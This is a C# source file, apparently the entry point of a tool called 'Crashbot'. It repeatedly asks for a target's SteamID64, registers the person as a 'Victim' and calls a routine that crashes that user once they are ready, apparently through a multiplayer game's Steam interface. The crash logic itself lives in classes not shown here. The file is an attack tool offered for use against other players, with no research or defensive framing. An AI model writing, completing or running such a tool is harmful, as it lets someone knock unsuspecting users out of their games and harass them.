using Newtonsoft.Json.Linq;
using SteamKit2;
using Steamworks;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Xml;
using System.Xml.Linq;
using static SteamKit2.Internal.CMsgRemoteClientBroadcastStatus;

namespace Crashbot
{
    internal class Program
    {

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            File.WriteAllText("steam_appid.txt", "387990");

            SteamInterface Steam = SteamInterface.NewAsyncInterface();

            while (true)
            {
                // Gather target
                Console.WriteLine(Environment.NewLine);
                Console.Write($"Enter target SteamID64: ");

                // Pretty parse the steamid
                AutoResetEvent Step = new(false);
                string steamid = Program.ReadSteamId();
                if (string.IsNullOrEmpty(steamid))
                    continue;

                CSteamID originalUserSteamid = new(ulong.Parse(steamid));
                Victim A = new(originalUserSteamid);

                Steam.AddNewVictim(A);
                Steam.CrashVictimWhenReady(A);
                Step.WaitOne();
            }
        }

        private static string ReadSteamId()
        {
            string steamid = Console.ReadLine()?.Trim() ?? string.Empty;

            if (string.IsNullOrEmpty(steamid))
                Console.WriteLine($"Invalid SteamID64");

            if (steamid.Contains("http", StringComparison.InvariantCultureIgnoreCase))
                steamid = steamid.Split('/').Last();

            return steamid;
        }        
    }
}
